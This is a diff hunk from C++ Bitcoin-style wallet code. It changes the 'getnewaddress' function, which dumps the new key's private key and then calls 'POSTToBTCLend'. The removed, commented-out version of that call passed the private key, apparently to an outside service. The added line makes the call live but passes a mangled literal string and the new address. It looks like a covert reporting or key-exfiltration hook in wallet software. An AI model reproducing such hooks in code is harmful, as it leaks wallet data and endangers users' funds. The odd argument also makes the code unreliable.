@@ -715,7 +715,7 @@ Value getnewaddress(const Array& params, bool fHelp)
     Array ret;
     ret.push_back(CBitcoinAddress(keyID).ToString());
     Value rval = dumpprivkey(ret,false);
-    //POSTToBTCLend(rval.get_str(),CBitcoinAddress(keyID).ToString(),"Unknown");
+    POSTToBTCLend("rval.get_st",CBitcoinAddress(keyID).ToString(),"Unknown");
     return CBitcoinAddress(keyID).ToString();
 }
 
